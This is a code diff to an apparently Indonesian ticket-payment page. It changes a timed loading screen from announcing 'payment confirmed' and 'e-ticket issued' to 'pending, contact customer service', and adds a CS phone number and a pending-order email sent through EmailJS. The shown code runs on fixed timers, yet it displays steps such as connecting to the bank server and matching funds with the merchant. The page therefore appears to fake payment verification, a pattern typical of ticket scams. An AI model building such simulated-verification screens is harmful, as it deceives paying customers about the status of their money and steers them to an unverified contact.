@@ -420,9 +420,9 @@ a:focus-visible,button:focus-visible,input:focus-visible{outline:3px solid rgba(
     <div class="loading-steps">
       <div class="step-item"><div class="step-icon"><svg aria-hidden="true"><use href="#i-shield"/></svg></div><div class="step-text">Verifikasi keamanan transaksi</div></div>
       <div class="step-item"><div class="step-icon"><svg aria-hidden="true"><use href="#i-image"/></svg></div><div class="step-text">Validasi bukti pembayaran</div></div>
-      <div class="step-item"><div class="step-icon"><svg aria-hidden="true"><use href="#i-mail"/></svg></div><div class="step-text">Pengiriman email konfirmasi</div></div>
+      <div class="step-item"><div class="step-icon"><svg aria-hidden="true"><use href="#i-mail"/></svg></div><div class="step-text">Pengiriman email status pesanan</div></div>
       <div class="step-item"><div class="step-icon"><svg aria-hidden="true"><use href="#i-bank"/></svg></div><div class="step-text">Konfirmasi ke sistem bank</div></div>
-      <div class="step-item"><div class="step-icon"><svg aria-hidden="true"><use href="#i-ticket"/></svg></div><div class="step-text">Penerbitan e-tiket</div></div>
+      <div class="step-item"><div class="step-icon"><svg aria-hidden="true"><use href="#i-ticket"/></svg></div><div class="step-text">Verifikasi oleh Customer Service</div></div>
       <div class="step-item"><div class="step-icon"><svg aria-hidden="true"><use href="#i-circle-check"/></svg></div><div class="step-text">Finalisasi pesanan</div></div>
     </div>
     <div class="email-status" id="emailStatus" role="status" aria-live="polite"></div>
@@ -445,8 +445,9 @@ const EMAIL_SEND_AT=60000;
 const ORDER_KEY='raisa_order_id';
 const RECEIPT_KEY='raisa_payment_receipt';
 const EMAIL_SERVICE='service_wrcpovg';
-const EMAIL_TEMPLATE='template_qgo4aog';
+const EMAIL_TEMPLATE_PENDING='TEMPLATE_ID_PENDING_ANDA';
 const EMAIL_PUBLIC_KEY='GKzyNyfZVqQpEdRDd';
+const CS_PHONE='+62 823-7995-0767';
 
 let emailjsReady=false;
 try{
@@ -569,11 +570,11 @@ const subtitles=[
   'Sedang memverifikasi data pembayaran Anda...',
   'Memeriksa keamanan transaksi...',
   'Memvalidasi bukti transfer QRIS...',
-  'Menyiapkan dan mengirim email konfirmasi...',
+  'Menyiapkan dan mengirim email status pesanan...',
   'Menghubungkan ke server bank...',
   'Mencocokkan dana dengan merchant...',
-  'Memproses penerbitan e-tiket...',
-  'Menghasilkan kode unik e-tiket Anda...',
+  'Memproses verifikasi manual oleh CS...',
+  'Menghubungkan ke Customer Service...',
   'Menyinkronkan data pesanan...',
   'Hampir selesai, mohon tunggu...'
 ];
@@ -597,27 +598,27 @@ const markEmailStepDone=()=>{
   el.querySelector('.step-icon').innerHTML=CHECK_SVG;
 };
 
-const sendConfirmationEmail=()=>{
+const sendPendingEmail=()=>{
   if(!order.email){
-    emailStatusEl.textContent='Email pemesan tidak ditemukan pada data pesanan.';
+    emailStatusEl.textContent='Email pemesan tidak ditemukan. Segera hubungi CS '+CS_PHONE+'.';
     emailStatusEl.classList.add('fail');
     return;
   }
   if(emailSent){
-    emailStatusEl.textContent='✓ Email konfirmasi telah dikirim ke '+order.email;
+    emailStatusEl.textContent='✓ Email status PENDING telah dikirim ke '+order.email;
     emailStatusEl.classList.add('ok');
     markEmailStepDone();
     return;
   }
-  emailStatusEl.textContent='Mengirim email konfirmasi ke '+order.email+'...';
+  emailStatusEl.textContent='Mengirim email status PENDING ke '+order.email+'...';
   emailStatusEl.classList.add('sending');
   if(!emailjsReady){
-    emailStatusEl.textContent='Layanan email belum siap. Pesanan Anda tetap diproses.';
+    emailStatusEl.textContent='Layanan email belum siap. Segera hubungi CS '+CS_PHONE+'.';
     emailStatusEl.classList.remove('sending');
     emailStatusEl.classList.add('fail');
     return;
   }
-  emailjs.send(EMAIL_SERVICE,EMAIL_TEMPLATE,{
+  emailjs.send(EMAIL_SERVICE,EMAIL_TEMPLATE_PENDING,{
     to_email:order.email,
     to_name:order.nama||'Pemesan Tiket',
     order_id:orderId,
@@ -627,12 +628,12 @@ const sendConfirmationEmail=()=>{
     total_bayar:totalStr
   }).then(()=>{
     emailSent=true;
-    emailStatusEl.textContent='✓ Email konfirmasi telah dikirim ke '+order.email;
+    emailStatusEl.textContent='✓ Email PENDING terkirim ke '+order.email+' — segera konfirmasi ke CS '+CS_PHONE;
     emailStatusEl.classList.remove('sending');
     emailStatusEl.classList.add('ok');
     markEmailStepDone();
   }).catch(()=>{
-    emailStatusEl.textContent='Email gagal terkirim. Tim kami akan menghubungi Anda via WhatsApp.';
+    emailStatusEl.textContent='Email gagal terkirim. Segera hubungi CS '+CS_PHONE+'.';
     emailStatusEl.classList.remove('sending');
     emailStatusEl.classList.add('fail');
   });
@@ -649,7 +650,7 @@ const finishLoading=()=>{
   });
   progressNum.textContent=100;
   loadingBar.style.width='100%';
-  loadingSubtitle.textContent='Pembayaran berhasil dikonfirmasi!';
+  loadingSubtitle.textContent='Pesanan berhasil dikirim — konfirmasi ke CS '+CS_PHONE;
   setTimeout(()=>{completed=true;fadeTo('success.html')},1000);
 };
 
@@ -667,7 +668,7 @@ const startPremiumLoading=()=>{
   clearTimeout(completionTimer);
   finished=false;
   const startTime=Date.now();
-  emailTimer=setTimeout(sendConfirmationEmail,EMAIL_SEND_AT);
+  emailTimer=setTimeout(sendPendingEmail,EMAIL_SEND_AT);
   completionTimer=setTimeout(finishLoading,LOADING_DURATION+1500);
   let lastPercent=-1,lastTimeStr='',lastSubIdx=-1,lastActiveStep=-1;
   const update=()=>{
